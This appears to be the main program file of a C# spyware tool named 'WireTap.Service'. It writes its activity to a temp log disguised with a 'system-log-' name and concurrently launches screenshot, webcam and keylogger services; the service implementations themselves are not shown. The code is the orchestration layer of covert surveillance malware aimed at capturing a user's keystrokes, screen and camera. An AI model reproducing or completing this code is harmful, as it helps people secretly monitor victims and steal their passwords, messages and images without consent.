namespace WireTap.Service
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Threading.Tasks;

    internal class Program
    {
        private static async Task Main(string[] args)
        {
            var logFileName = Helpers.CreateTempFileName(".log", "system-log-", "logs");
            using (var fileStream = new FileStream(logFileName, FileMode.OpenOrCreate, FileAccess.Write))
            using (var streamWriter = new StreamWriter(fileStream))
            {
                var dateTime = DateTime.Now;
                Console.SetOut(streamWriter);
                Console.WriteLine($"Starting WireTap Services at {dateTime.ToShortDateString()} {dateTime.ToShortTimeString()}");

                try
                {
                    var tasks = new List<Task>
                    {
                        (new ScreenshotService() as IService).TryExecuteAsync(),
                        (new WebcamService() as IService).TryExecuteAsync(),
                        (new KeyloggerService() as IService).TryExecuteAsync()
                    };

                    await Task.WhenAll(tasks);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Program : A fatal exception has occurred" + '\n' + ex.Message + '\n' + ex.StackTrace);
                }
                finally
                {
                    streamWriter.Close();
                    fileStream.Close();
                }
            }
        }
    }
}